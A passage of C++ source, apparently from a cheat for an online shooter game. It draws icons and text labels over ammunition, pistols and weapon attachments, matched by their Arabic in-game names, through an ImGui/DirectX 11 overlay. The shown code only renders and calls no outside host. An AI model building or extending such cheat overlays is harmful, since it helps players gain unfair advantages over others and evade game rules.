															DX11::ImGui_DX11::DrawImage(DX11::Amm7, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Amm7, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_762mm_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_762mm_Color[0], Setting::Esp_Item_762mm_Color[1], Setting::Esp_Item_762mm_Color[2], Setting::Esp_Item_762mm_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_556mm && Item.Name == u8"5.56 ﻖﻠﻃ")
												{

													if (Setting::Esp_Item_556mm_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Amm5, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Amm5, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_556mm_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_556mm_Color[0], Setting::Esp_Item_556mm_Color[1], Setting::Esp_Item_556mm_Color[2], Setting::Esp_Item_556mm_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_9mm && Item.Name == u8"9 ﻖﻠﻃ")
												{
													if (Setting::Esp_Item_9mm_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Amm9, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Amm9, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_9mm_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_9mm_Color[0], Setting::Esp_Item_9mm_Color[1], Setting::Esp_Item_9mm_Color[2], Setting::Esp_Item_9mm_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_12Guage && Item.Name == u8"ﻦﺠﺗﻮﺷ ﻖﻠﻃ")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_12Guage_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_12Guage_Color[0], Setting::Esp_Item_12Guage_Color[1], Setting::Esp_Item_12Guage_Color[2], Setting::Esp_Item_12Guage_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_45ACP && Item.Name == u8"45 ﻖﻠﻃ")
												{
													if (Setting::Esp_Item_45ACP_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Amm45, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Amm45, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
												//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_45ACP_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_45ACP_Color[0], Setting::Esp_Item_45ACP_Color[1], Setting::Esp_Item_45ACP_Color[2], Setting::Esp_Item_45ACP_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_DesertEagle && Item.Name == u8"ﻞﺠﻳﺍ ﺕﺭﺰﻳﺩ")
												{
													if (Setting::Esp_Item_DesertEagle_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::DesertEagle, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::DesertEagle, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_DesertEagle_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_DesertEagle_Color[0], Setting::Esp_Item_DesertEagle_Color[1], Setting::Esp_Item_DesertEagle_Color[2], Setting::Esp_Item_DesertEagle_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_P1911 && Item.Name == u8"1911ﻲﺑ")
												{
													if (Setting::Esp_Item_P1911_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::P1911, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::P1911, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_P1911_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_P1911_Color[0], Setting::Esp_Item_P1911_Color[1], Setting::Esp_Item_P1911_Color[2], Setting::Esp_Item_P1911_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_R45 && Item.Name == u8"45ﺭﺍ")
												{
													if (Setting::Esp_Item_R45_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::R45, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::R45, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_R45_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_R45_Color[0], Setting::Esp_Item_R45_Color[1], Setting::Esp_Item_R45_Color[2], Setting::Esp_Item_R45_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_P18C && Item.Name == u8"ﻲﺳ 18 ﻲﺑ")
												{
													if (Setting::Esp_Item_P18C_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::P18C, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::P18C, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_P18C_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_P18C_Color[0], Setting::Esp_Item_P18C_Color[1], Setting::Esp_Item_P18C_Color[2], Setting::Esp_Item_P18C_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_P92 && Item.Name == u8"92 ﻲﺑ")
												{
													if (Setting::Esp_Item_P92_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::P92, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::P92, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_P92_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_P92_Color[0], Setting::Esp_Item_P92_Color[1], Setting::Esp_Item_P92_Color[2], Setting::Esp_Item_P92_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Vz61 && Item.Name == u8"61ﺩﺯ ﻲﻓ")
												{
													if (Setting::Esp_Item_Vz61_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Vz61, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Vz61, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Vz61_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Vz61_Color[0], Setting::Esp_Item_Vz61_Color[1], Setting::Esp_Item_Vz61_Color[2], Setting::Esp_Item_Vz61_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_R1895 && Item.Name == u8"1895ﺭﺍ ﻲﻓ")
												{
													if (Setting::Esp_Item_R1895_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::R1895, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::R1895, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_R1895_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_R1895_Color[0], Setting::Esp_Item_R1895_Color[1], Setting::Esp_Item_R1895_Color[2], Setting::Esp_Item_R1895_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Vertical && Item.Name == u8"ﺭﺍ ﻱﺍ ﻞﻜﻴﺗﺮﻴﻓ")
												{
													if (Setting::Esp_Item_Vertical_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Vertical, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Vertical, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Vertical_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Vertical_Color[0], Setting::Esp_Item_Vertical_Color[1], Setting::Esp_Item_Vertical_Color[2], Setting::Esp_Item_Vertical_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_HalfGrip && Item.Name == u8"ﺭﺍ ﻱﺍ ﺐﻳﺮﺟ ﻒﻟﺎﻫ")
												{
													if (Setting::Esp_Item_HalfGrip_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::HalfGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::HalfGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_HalfGrip_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_HalfGrip_Color[0], Setting::Esp_Item_HalfGrip_Color[1], Setting::Esp_Item_HalfGrip_Color[2], Setting::Esp_Item_HalfGrip_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_LightGrip && Item.Name == u8"ﺭﺍ ﻱﺍ ﺐﻳﺮﺟ ﺖﻳﻻ")
												{
													if (Setting::Esp_Item_LightGrip_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::LightGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::LightGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_LightGrip_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_LightGrip_Color[0], Setting::Esp_Item_LightGrip_Color[1], Setting::Esp_Item_LightGrip_Color[2], Setting::Esp_Item_LightGrip_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Angled && Item.Name == u8"ﺭﺍ ﻱﺍ ﺪﻠﻴﺠﻧﺍ")
												{
													if (Setting::Esp_Item_Angled_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Angled, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Angled, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Angled_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Angled_Color[0], Setting::Esp_Item_Angled_Color[1], Setting::Esp_Item_Angled_Color[2], Setting::Esp_Item_Angled_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Lasersight && Item.Name == u8"ﺭﺍ ﻱﺍ ﺭﺰﻴﻟ")
												{
													if (Setting::Esp_Item_Lasersight_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Lasersight, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Lasersight, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Lasersight_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Lasersight_Color[0], Setting::Esp_Item_Lasersight_Color[1], Setting::Esp_Item_Lasersight_Color[2], Setting::Esp_Item_Lasersight_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_ThumbGrip && Item.Name == u8"ﺭﺍ ﻱﺍ ﺐﻳﺮﺟ ﺐﻣﺎﺛ")
												{
													if (Setting::Esp_Item_ThumbGrip_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ThumbGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ThumbGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_ThumbGrip_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_ThumbGrip_Color[0], Setting::Esp_Item_ThumbGrip_Color[1], Setting::Esp_Item_ThumbGrip_Color[2], Setting::Esp_Item_ThumbGrip_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mid_FlashHider && Item.Name == u8"ﻲﺟ ﻡﺍ ﺱﺍ ﺭﺪﻳﺎﻫ ﺵﻼﻓ")
												{
													if (Setting::Esp_Item_Mid_FlashHider_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mid_FlashHider_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mid_FlashHider_Color[0], Setting::Esp_Item_Mid_FlashHider_Color[1], Setting::Esp_Item_Mid_FlashHider_Color[2], Setting::Esp_Item_Mid_FlashHider_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mid_Compensator && Item.Name == u8"ﻲﺟ ﻡﺍ ﺱﺍ ﺭﻮﺘﻴﺴﻨﺒﻣﻮﻛ")
												{
													if (Setting::Esp_Item_Mid_Compensator_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mid_Compensator_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mid_Compensator_Color[0], Setting::Esp_Item_Mid_Compensator_Color[1], Setting::Esp_Item_Mid_Compensator_Color[2], Setting::Esp_Item_Mid_Compensator_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mid_Suppressor && Item.Name == u8"ﻲﺟ ﻡﺍ ﺱﺍ ﻢﺗﺎﻛ")
												{
													if (Setting::Esp_Item_Mid_Suppressor_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mid_Suppressor_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mid_Suppressor_Color[0], Setting::Esp_Item_Mid_Suppressor_Color[1], Setting::Esp_Item_Mid_Suppressor_Color[2], Setting::Esp_Item_Mid_Suppressor_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Large_FlashHider && Item.Name == u8"ﺭﺍ ﻱﺍ ﺭﺪﻳﺎﻫ ﺵﻼﻓ")
												{
													if (Setting::Esp_Item_Large_FlashHider_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Large_FlashHider_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Large_FlashHider_Color[0], Setting::Esp_Item_Large_FlashHider_Color[1], Setting::Esp_Item_Large_FlashHider_Color[2], Setting::Esp_Item_Large_FlashHider_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Large_Compensator && Item.Name == u8"كومبنسيتور اي ار")
												{
													if (Setting::Esp_Item_Large_Compensator_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Large_Compensator_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Large_Compensator_Color[0], Setting::Esp_Item_Large_Compensator_Color[1], Setting::Esp_Item_Large_Compensator_Color[2], Setting::Esp_Item_Large_Compensator_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Large_Suppressor && Item.Name == u8"ﺭﺍ ﻱﺍ ﻢﺗﺎﻛ")
												{
													if (Setting::Esp_Item_Large_Suppressor_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Large_Suppressor_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Large_Suppressor_Color[0], Setting::Esp_Item_Large_Suppressor_Color[1], Setting::Esp_Item_Large_Suppressor_Color[2], Setting::Esp_Item_Large_Suppressor_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Taktik && Item.Name == u8"Chekpad_AR")
												{
													if (Setting::Esp_Item_Taktik_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARCheckPad, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARCheckPad, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Taktik_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Taktik_Color[0], Setting::Esp_Item_Taktik_Color[1], Setting::Esp_Item_Taktik_Color[2], Setting::Esp_Item_Taktik_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_FlashHider && Item.Name == u8"ﺮﺒﻳﺎﻨﺳ ﺭﺪﻳﺎﻫ ﺵﻼﻓ")
												{
													if (Setting::Esp_Item_Sniper_FlashHider_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_FlashHider_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_FlashHider_Color[0], Setting::Esp_Item_Sniper_FlashHider_Color[1], Setting::Esp_Item_Sniper_FlashHider_Color[2], Setting::Esp_Item_Sniper_FlashHider_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_Compensator && Item.Name == u8"ﺮﺒﻳﺎﻨﺳ ﺭﻮﺘﻴﺴﻨﺒﻣﻮﻛ")
												{
													if (Setting::Esp_Item_Sniper_Compensator_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_Compensator_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_Compensator_Color[0], Setting::Esp_Item_Sniper_Compensator_Color[1], Setting::Esp_Item_Sniper_Compensator_Color[2], Setting::Esp_Item_Sniper_Compensator_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_Suppressor && Item.Name == u8"ﺮﺒﻳﺎﻨﺳ ﻢﺗﺎﻛ")
												{
													if (Setting::Esp_Item_Sniper_Suppressor_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_Suppressor_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_Suppressor_Color[0], Setting::Esp_Item_Sniper_Suppressor_Color[1], Setting::Esp_Item_Sniper_Suppressor_Color[2], Setting::Esp_Item_Sniper_Suppressor_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Chekpad_Sniper && Item.Name == u8"ﺮﺒﻳﺎﻨﺳ ﺩﺎﺑ ﻚﻴﺸﺗ")
												{
													if (Setting::Esp_Item_Chekpad_Sniper_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
